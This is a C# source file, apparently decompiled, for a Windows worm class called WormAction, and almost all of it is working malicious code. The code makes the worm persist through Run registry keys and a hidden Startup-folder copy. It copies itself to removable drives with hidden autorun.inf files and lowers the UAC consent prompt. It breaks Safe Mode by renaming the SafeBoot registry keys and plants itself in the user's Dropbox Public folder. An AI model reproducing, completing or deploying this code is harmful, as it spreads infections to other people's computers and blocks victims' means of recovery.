using System;
using System.IO;
using System.Text;
using Handyware;
using Microsoft.Win32;

internal class WormAction
{
	private string WorkspacePath;

	private string CurrentApplicationPath;

	private string dropboxPublicPath;

	private string logPath;

	private byte[] getBytesOfFile(string filePath)
	{
		FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		byte[] result = binaryReader.ReadBytes(Convert.ToInt32(new FileInfo(filePath).Length));
		binaryReader.Close();
		fileStream.Close();
		return result;
	}

	private void writeLog(string text)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(logPath, append: true);
			streamWriter.WriteLine(text);
			streamWriter.Write("\r\n\r\n");
			streamWriter.Close();
		}
		catch
		{
		}
	}

	public WormAction(string ProgramWorkspacePath, string CompleteApplicationPath, string log_path)
	{
		WorkspacePath = ProgramWorkspacePath;
		CurrentApplicationPath = CompleteApplicationPath;
		dropboxPublicPath = "";
		logPath = log_path;
	}

	public string SetStartupON(string RegistryKeyName, string CompletFileName2Startup)
	{
		try
		{
			if (!File.Exists(WorkspacePath + "\\" + CompletFileName2Startup))
			{
				File.Copy(CurrentApplicationPath, WorkspacePath + "\\" + CompletFileName2Startup, overwrite: false);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(RegistryKeyName, WorkspacePath + "\\" + CompletFileName2Startup);
			return "HKLM";
		}
		catch
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(RegistryKeyName, WorkspacePath + "\\" + CompletFileName2Startup);
				return "HKCU";
			}
			catch
			{
				try
				{
					File.Copy(CurrentApplicationPath, Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + "\\" + CompletFileName2Startup, overwrite: true);
					File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + "\\" + CompletFileName2Startup, FileAttributes.Hidden);
					return "StartUp Folder";
				}
				catch
				{
				}
			}
		}
		return "No";
	}

	public string SetStartupON(string RegistryKeyName, string path2Startup, bool withouWorkspace)
	{
		try
		{
			if (!File.Exists(path2Startup))
			{
				File.Copy(CurrentApplicationPath, path2Startup, overwrite: false);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(RegistryKeyName, path2Startup);
			return "HKLM";
		}
		catch
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(RegistryKeyName, path2Startup);
				return "HKCU";
			}
			catch
			{
			}
		}
		return "No";
	}

	public bool CopyToFolder(string CompletePATHandFILENAME, bool OverWrite)
	{
		try
		{
			try
			{
				File.Delete(CompletePATHandFILENAME);
			}
			catch
			{
			}
			File.Copy(CurrentApplicationPath, CompletePATHandFILENAME, OverWrite);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool CopyToFolder(string CompletePATHandFILENAME, bool OverWrite, bool hide)
	{
		try
		{
			try
			{
				File.Delete(CompletePATHandFILENAME);
			}
			catch
			{
			}
			File.Copy(CurrentApplicationPath, CompletePATHandFILENAME, OverWrite);
			if (hide)
			{
				File.SetAttributes(CompletePATHandFILENAME, FileAttributes.Hidden);
			}
			else
			{
				File.SetAttributes(CompletePATHandFILENAME, FileAttributes.Normal);
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void CopyToRemovableDevices(string FileCompleteNameOnRemovableDevice, bool HideFile, bool SetAutorun)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			try
			{
				if (text.Contains("c") || text.Contains("C"))
				{
					continue;
				}
				if (!File.Exists(text + FileCompleteNameOnRemovableDevice))
				{
					File.Copy(CurrentApplicationPath, text + FileCompleteNameOnRemovableDevice, overwrite: true);
					if (HideFile)
					{
						File.SetAttributes(text + FileCompleteNameOnRemovableDevice, FileAttributes.Hidden);
					}
					else
					{
						File.SetAttributes(text + FileCompleteNameOnRemovableDevice, FileAttributes.Normal);
					}
					if (SetAutorun)
					{
						try
						{
							File.Delete(text + "autorun.inf");
						}
						catch
						{
						}
						StreamWriter streamWriter = new StreamWriter(text + "autorun.inf", append: false);
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine("open=" + FileCompleteNameOnRemovableDevice);
						streamWriter.Write("icon=" + FileCompleteNameOnRemovableDevice);
						streamWriter.Close();
						File.SetAttributes(text + "autorun.inf", FileAttributes.Hidden);
					}
				}
				else
				{
					if (!(Hash.SHA512(text + FileCompleteNameOnRemovableDevice) != Hash.SHA512(CurrentApplicationPath)))
					{
						continue;
					}
					File.Delete(text + FileCompleteNameOnRemovableDevice);
					File.Copy(CurrentApplicationPath, text + FileCompleteNameOnRemovableDevice, overwrite: true);
					if (HideFile)
					{
						File.SetAttributes(text + FileCompleteNameOnRemovableDevice, FileAttributes.Hidden);
					}
					else
					{
						File.SetAttributes(text + FileCompleteNameOnRemovableDevice, FileAttributes.Normal);
					}
					if (SetAutorun)
					{
						try
						{
							File.Delete(text + "autorun.inf");
						}
						catch
						{
						}
						StreamWriter streamWriter = new StreamWriter(text + "autorun.inf", append: false);
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine("open=" + FileCompleteNameOnRemovableDevice);
						streamWriter.Write("icon=" + FileCompleteNameOnRemovableDevice);
						streamWriter.Close();
						File.SetAttributes(text + "autorun.inf", FileAttributes.Hidden);
					}
					continue;
				}
			}
			catch
			{
			}
		}
	}

	public void removeUACRegistry()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey.SetValue("EnableLUA", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("ConsentPromptBehaviorAdmin", "00000000", RegistryValueKind.DWord);
		}
		catch
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey.DeleteValue("EnableLUA");
				registryKey.DeleteValue("ConsentPromptBehaviorAdmin");
				registryKey.SetValue("EnableLUA", "00000001", RegistryValueKind.DWord);
				registryKey.SetValue("ConsentPromptBehaviorAdmin", "00000000", RegistryValueKind.DWord);
			}
			catch (Exception ex)
			{
				writeLog("Remove UAC\r\nError: " + ex.Message);
			}
		}
	}

	public void removeBootSafe()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				new regUtilities().RenameSubKey(registryKey, subKeyNames[i], subKeyNames[i] + "-");
			}
		}
		catch (Exception ex)
		{
			writeLog("Remove BootSafe\r\nError: " + ex.Message);
		}
	}

	public void disableWindowsSearch()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			registryKey.DeleteValue("Start_SearchFiles");
		}
		catch
		{
		}
	}

	public bool copyToDropbox(string fileName_inDropbox)
	{
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dropbox\\config.db";
			if (File.Exists(path))
			{
				try
				{
					if (!Directory.Exists(dropboxPublicPath))
					{
						StreamReader streamReader = new StreamReader(path, Encoding.UTF8);
						string text = streamReader.ReadToEnd();
						streamReader.Close();
						int num = text.IndexOf("dropbox_path") + 12;
						int num2 = text.IndexOf("Dropbox", num);
						dropboxPublicPath = "";
						for (int i = num; i < num2; i++)
						{
							dropboxPublicPath += text[i];
						}
						dropboxPublicPath += "Dropbox\\Public\\";
						if (!Directory.Exists(dropboxPublicPath))
						{
							return false;
						}
					}
					File.Copy(CurrentApplicationPath, dropboxPublicPath + fileName_inDropbox, overwrite: true);
					return true;
				}
				catch
				{
					return false;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}
}
